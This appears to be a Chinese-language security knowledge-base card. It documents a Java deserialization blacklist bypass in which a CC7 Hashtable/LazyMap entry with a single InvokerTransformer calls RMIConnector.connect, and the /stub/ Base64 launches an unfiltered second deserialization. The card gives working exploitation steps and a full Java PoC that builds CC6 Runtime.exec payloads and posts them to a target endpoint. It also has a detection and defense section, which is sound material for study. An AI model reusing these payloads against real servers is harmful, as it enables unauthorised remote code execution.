---
id: web-java-deser-serialkiller-blacklist-cc7-invoker-rmiconnector-secondary
title: SerialKiller 类名黑名单下用 CC7 入口 + 单个 InvokerTransformer 调 RMIConnector.connect，借 /stub/ Base64 完成二次反序列化
type: scenario
domain: web
path: web/java/deserialization
technique: cc7-invoker-rmiconnector-stub-secondary-deser-blacklist-bypass
tags:
- java
- deserialization
- blacklist-bypass
- secondary-deserialization
- rmiconnector
- commons-collections
- cc7
- invokertransformer
- lazyMap
- templatesimpl
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-17
  verified_at: '2026-11-08T11:32:56+08:00'
  notes: 已对照原文核对：serialkiller.xml 黑名单（禁 TiedMapEntry/ChainedTransformer/TemplatesImpl 等、漏 InvokerTransformer）、RMIConnector findRMIServerJRMP(/stub/ base64 readObject) 源码链（图06-09）、CC7 Hashtable+两 LazyMap、反射改 HashMap$Node.key 调试过程（图12-14）与原文一致；最终危害由图15 弹计算器证明（CC7 入口 + TemplatesImpl 内层），图11 为 CC6 外层本地对照；均为本地 Unserialize 测试，原文未展示对靶场 /closetome 的最终投递截图，confidence medium 保守合理。与 rmiconnector-secondary 候选卡外层载体（反射类 vs CC7+Node.key 改写）与内层 sink 均不同，append_scenario 成立；dup-scan 与 14431 FactoryTransformer 卡判 related，机制不同并列保留。无 CVE/版本标记，留空正确。
url: /docs/web/java/deserialization/web-java-deser-serialkiller-blacklist-cc7-invoker-rmiconnector-secondary/
draft: false
kb_aliases:
- SerialKiller 绕过
- RMIConnector 二次反序列化
- /stub/ Base64 反序列化
- TiedMapEntry 被禁后的 key 注入
- HashMap$Node key 反射改写
- CC7 调 connect
- 单 InvokerTransformer 打 connect
---

## 一句话结论

当入口用 SerialKiller（或任何在 `resolveClass` 层做类名正则黑名单的 `ObjectInputStream` 子类）把 `ChainedTransformer`、`TiedMapEntry`、`TemplatesImpl`、`BadAttributeValueExpException`、`SignedObject`、`JdbcRowSetImpl` 等全部拦掉、却漏掉 `InvokerTransformer` 与 `LazyMap`/`ConstantTransformer` 时，可以用 CC7 的 `Hashtable + 两个 LazyMap` 入口承载**单个** `InvokerTransformer("connect")`，让它去调未被黑名单覆盖的 `javax.management.remote.rmi.RMIConnector.connect(null)`；RMIConnector 会把 `JMXServiceURL` 里 `/stub/<base64>` 解码后**另起一个 JDK 原生 `ObjectInputStream`** 反序列化，内层于是完全脱离 SerialKiller 的约束，可投递 CC6 或 `TemplatesImpl` 字节码实现 RCE。

## 原理

- **黑名单只作用于当前这一条流**：SerialKiller 继承 `ObjectInputStream` 并重写 `resolveClass`，命中正则就抛异常。`RMIConnector` 在方法内部 `new ObjectInputStream(bin).readObject()` 读另一段字节，新流不继承外层子类的 `resolveClass`，内层 payload 的类名从不经过黑名单判定——这是整条链的立足点。
- **RMIConnector 的内层反序列化路径**：`connect(Map)` 在 `rmiServer == null` 时调用 `findRMIServer(jmxServiceURL, usemap)`；`findRMIServer` 取 `directoryURL.getURLPath()`，截到第一个 `;` 之前，`path.startsWith("/stub/")` 时把 `path.substring(6)` 交给 `findRMIServerJRMP`；后者 `base64ToByteArray(base64)` 后 `new ObjectInputStream(bin).readObject()`，返回值强制转 `RMIServer`。所以只要 URL 的 `urlPath` 是 `/stub/<任意序列化对象的 Base64>`，`connect()` 就会替我们反序列化一次。
- **为什么构造器能造出 rmiServer == null**：`RMIConnector(JMXServiceURL url, Map environment)` 的实现是 `this(null, url, environment)`，第一个参数（stub）为 null，正好满足 `connect()` 走 `findRMIServer` 分支；`environment` 传 `null` 即可（`connect` 里 `this.env == null` 会用空 Map，`environment` 为 null 时跳过 `checkAttributes`）。
- **为什么只能用一个 InvokerTransformer**：黑名单把 `ChainedTransformer` 拦了，`Runtime` 又不可序列化，所以没法在**外层**直接拼 `Runtime.exec` 链。但 `InvokerTransformer` 本身没被拦（黑名单里只有 `org\.apache\.commons\.collections\.Transformer$` 这类只匹配接口名的正则），它一次就能「对任意对象调用任意无参方法」——把输入设成 `RMIConnector`、方法名设成 `connect`，就完成了对外层载体的调用。真正的命令执行交给内层。
- **CC7 入口为什么能触发 `transform`**：`Hashtable.readObject` 重建表时对每个键做 `reconstitutionPut`，会调用 `key.hashCode()` 并在哈希冲突时做 `key.equals(otherKey)`。当两个键都是 `LazyMap` 时，`AbstractMap.equals` 会遍历自己的 entry，对另一个 map 调 `get(key)`；`LazyMap.get` 未命中就 `factory.transform(key)`。因此传给 `transform` 的是**被查找的那个 key**，必须让这个 key 就是 `RMIConnector` 实例。
- **TiedMapEntry 被禁后如何注入这个 key**：`TiedMapEntry(map, key)` 的作用正是「让 `map.get()` 收到指定 key」，它被拦了就只能换办法：`LazyMap` 底层是 `HashMap`，先正常 `put("1","yy")` 避免当场触发链，再反射拿到 `HashMap.table` 数组、取出 `HashMap$Node`，把 `node.key` 改成 `RMIConnector`。`HashMap$Node.key` 不是 `final`，反射可写；这样查找键就变成了 RMIConnector，`factory.transform(rmiConnector)` → `invokerTransformer.transform(rmiConnector)` → `rmiConnector.connect()`。
- **为什么外层类名都不在黑名单里**：外层流里出现的类只有 `Hashtable`、`HashMap`、`LazyMap`、`ConstantTransformer`、`InvokerTransformer`、`RMIConnector`、`JMXServiceURL` 等，均未命中 SerialKiller 的正则；被拦的 `TiedMapEntry`、`ChainedTransformer`、`TemplatesImpl` 全部只出现在内层 Base64 字符串里。

## 触发条件

- 反序列化入口用 SerialKiller/自写 `resolveClass` 做**类名黑名单**（而非 JEP 290 的 `jdk.serialFilter` 全局过滤器或 `ObjectInputFilter`），且对每次 `new ObjectInputStream` 都套同一策略。
- classpath 有 commons-collections 3.x，且 `InvokerTransformer`、`LazyMap`、`ConstantTransformer`、`Hashtable` 未被列入黑名单。
- 目标 JDK 保留 `javax.management.remote.rmi.RMIConnector`（未裁剪 management 模块），且 `JMXServiceURL` 的 `urlPath` 可通过反射改写（默认不是 final）。
- 内层 sink 可用：commons-collections（CC6）或 `TemplatesImpl` + 可加载的 `TransformerFactoryImpl`，且 JDK 未强封装 Xalan 内部类。
- 未启用 JEP 290 全局过滤器（否则 RMIConnector 内部新建的流也会被 `jdk.serialFilter` 过滤）。
- 攻击者能提交 Base64 序列化数据到入口（本例 `POST /closetome` 的 `exp` 参数）。

## 利用步骤

1. 拿到 `.class` 或反编译入口，确认反序列化实现与黑名单来源（本例 `/WEB-INF/classes/config/serialkiller.xml`）；逐条比对哪些类被拦，找出「漏网」的 `InvokerTransformer` 与 `LazyMap`。
2. 构造内层 payload（不受黑名单约束）：CC6（`HashSet`→`TiedMapEntry`→`LazyMap`→`ChainedTransformer`→`Runtime.exec`）或 `TemplatesImpl`（`_bytecodes` 加载字节码），序列化后 Base64。
3. 把内层 Base64 拼进 `/stub/`：`new JMXServiceURL("service:jmx:rmi://")`，反射把 `urlPath` 设为 `"/stub/" + inner`，再 `new RMIConnector(url, null)`。
4. 外层载体：`map1 = LazyMap.decorate(hashMap1, new ConstantTransformer(1))`、`map2 = LazyMap.decorate(hashMap2, new InvokerTransformer("connect", null, null))`；`map1.put("1","yy")`、`map2.put("zZ", rmiConnector)`。
5. 反射改 key：取 `hashMap1.table[0]`（或 `[1]`）的 `HashMap$Node`，把其 `key` 由 `"1"` 改为 `rmiConnector`。
6. 把两个 LazyMap 作为 key 放进 `Hashtable`，序列化整体，Base64 后提交到入口。
7. 反序列化 → `Hashtable` 比较键 → `LazyMap.get(rmiConnector)` → `InvokerTransformer` 调 `connect()` → `/stub/` Base64 解码 → 内层 `readObject()` → 命令执行/字节码加载。

## PoC

```java
// 内层：CC6（外层黑名单管不到这条流）
static String innerCC6(String cmd) throws Exception {
    Transformer[] ts = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
    };
    Map lazy = LazyMap.decorate(new HashMap<>(), new ConstantTransformer("useless"));
    TiedMapEntry tme = new TiedMapEntry(lazy, "abc");
    HashMap<Object,Object> m = new HashMap<>(); m.put(tme, "def");
    HashSet<Object> hs = new HashSet<>(); setField(hs, "map", m);
    lazy.remove("abc"); setField(lazy, "factory", new ChainedTransformer(ts));
    return Base64.getEncoder().encodeToString(ser(hs));
}

// 外层：CC7 入口 + 单个 InvokerTransformer -> RMIConnector.connect()
JMXServiceURL url = new JMXServiceURL("service:jmx:rmi://");
setField(url, "urlPath", "/stub/" + innerCC6("calc"));
RMIConnector conn = new RMIConnector(url, null);

Map h1 = new HashMap(), h2 = new HashMap();
Map m1 = LazyMap.decorate(h1, new ConstantTransformer(1));        // 只为了让 m1 有一个 entry
Map m2 = LazyMap.decorate(h2, new InvokerTransformer("connect", null, null));
m1.put("1", "yy");
m2.put("zZ", conn);

Hashtable<Object,Object> ht = new Hashtable<>();
ht.put(m1, 1); ht.put(m2, 1);

// TiedMapEntry 被禁：直接改 HashMap$Node.key，让查找键变成 RMIConnector
Field tf = h1.getClass().getDeclaredField("table"); tf.setAccessible(true);
Object[] table = (Object[]) tf.get(h1);
Object node = table[0] != null ? table[0] : table[1];
Field kf = node.getClass().getDeclaredField("key"); kf.setAccessible(true);
kf.set(node, conn);

submit(Base64.getEncoder().encodeToString(ser(ht)));              // POST exp=<base64> 到 /closetome
```

说明：`Hashtable` 中两个 key 的哈希必须落在同一桶才会触发 `equals`；本例靠两个 `LazyMap` 的 `hashCode`（装饰的 HashMap 均为空/单元素）落到同桶，实际环境需按序列化后的桶位调整 `map1.put` 的键值或再加元素。

## 变体与关联

- 变体：内层 sink 换成 `TemplatesImpl`（`InvokerTransformer("newTransformer")` + `LazyMap` + `TiedMapEntry`）直接加载字节码，避免依赖 CC 的 `Runtime.exec` 反射链；因为内层不过滤，`TiedMapEntry` 反而可用。
- 变体：外层入口换成 CC6（`HashSet` + `TiedMapEntry`），但前提是黑名单没有拦 `TiedMapEntry`——本例正是被拦才改用 CC7 + 反射改 key。
- 变体：`/stub/` 换成 `/jndi/`（`findRMIServerJNDI`）或 `/ior/`（`findRMIServerIIOP`），前者走 JNDI `InitialContext.lookup`，等于换一个 sink。
- 变体：`RMIConnector` 还可换成 `SignedObject.getObject()`、`JdbcRowSetImpl` 等任何「方法内部再建流」的 JDK 类。
- 关联：[[web-java-deser-readobject-reflection-rmiconnector-secondary]]（同一 RMIConnector `/stub/` 二次反序列化原语，但外层用业务自带反射类调用 `connect`，内层用 Jackson `POJONode`+`TemplatesImpl`）、[[web-java-deserialization-jackson-signedobject-getobject-short-chain]]、[[web-java-deser-resolveproxyclass-blacklist-hutool-mapproxy]]。
- 边界：SerialKiller 若配置成**白名单**模式，或应用改用 JEP 290 `ObjectInputFilter`/`setSerialFilterFactory` 让每个新流继承全局策略，内层仍会被拦，链失效；JDK 高版本对 `com.sun.org.apache.xalan.internal.xsltc.trax` 的强封装会让 `TemplatesImpl` 路线失败，此时只能走内层 CC6；`JMXServiceURL.urlPath` 若被改成 final 或 `RMIConnector` 被裁剪，同样不成立。

## 检测与防御

- 检测：序列化流中出现 `javax.management.remote.rmi.RMIConnector`、`JMXServiceURL`，且 `urlPath` 为 `/stub/` 后跟长 Base64；同一请求内出现二次 `readObject`（可 hook `ObjectInputStream` 构造器统计）；黑名单命中日志突然为 0 但进程出现 `Runtime.exec` 子进程。
- 修复：不要用类名黑名单；改用 JEP 290 `ObjectInputFilter` 白名单，并用 `ObjectInputFilter.Config.setSerialFilterFactory` 保证**每个**新建的 `ObjectInputStream` 都继承同一策略（这是拦住 RMIConnector 类内层流的关键）。
- 加固：移除不必要的原生反序列化入口（改用 JSON/Protobuf）；升级 commons-collections 到 4.x 并移除 `InvokerTransformer` 的可序列化调用面；JDK 升级到默认启用 serialFilter 的版本并显式配置；限制 `javax.management` 模块在业务进程中的可用性。
- 响应：确认失陷后清理落地字节码/内存马，排查 `RMIConnector`、`LazyMap` 相关类加载，检查是否有 Base64 大参数的历史请求记录。
